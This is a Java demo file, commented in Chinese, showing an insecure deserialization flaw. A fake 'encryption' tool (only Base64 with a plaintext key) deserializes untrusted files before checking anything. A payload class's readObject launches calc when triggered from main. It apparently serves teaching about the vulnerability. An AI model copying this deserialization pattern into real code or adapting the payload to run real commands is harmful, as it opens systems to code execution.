import java.io.*;
import java.util.Base64;

/**
 * 极简文件加解密工具
 * 存在不安全反序列化漏洞
 */
public class FileCryptor {
    
    // 模拟加密数据类
    static class EncryptedData implements Serializable {
        String content;
        String key;
    }

    // 模拟加密操作
    public static void encrypt(String content, String key, String outFile) throws Exception {
        EncryptedData data = new EncryptedData();
        data.content = Base64.getEncoder().encodeToString(content.getBytes());
        data.key = key;
        
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outFile))) {
            oos.writeObject(data);
        }
    }

    // 存在漏洞的解密操作
    public static String decrypt(String inFile) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(inFile))) {
            // 漏洞点：直接反序列化不可信数据
            EncryptedData data = (EncryptedData) ois.readObject();
            if (!"SECRET_KEY".equals(data.key)) throw new SecurityException("Invalid key");
            return new String(Base64.getDecoder().decode(data.content));
        }
    }

    // 模拟攻击载荷类
    static class MaliciousPayload implements Serializable {
        private void readObject(ObjectInputStream in) throws Exception {
            // 恶意代码执行
            Runtime.getRuntime().exec("calc");
        }
    }

    // 攻击演示方法
    public static void createMaliciousFile(String outFile) throws Exception {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outFile))) {
            // 构造恶意对象
            oos.writeObject(new MaliciousPayload());
        }
    }

    public static void main(String[] args) {
        try {
            // 正常使用示例
            encrypt("Hello World", "SECRET_KEY", "safe.dat");
            System.out.println("正常解密: " + decrypt("safe.dat"));
            
            // 创建恶意文件
            createMaliciousFile("malicious.dat");
            // 触发漏洞（会导致执行计算器）
            System.out.println("开始解密恶意文件...");
            decrypt("malicious.dat");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}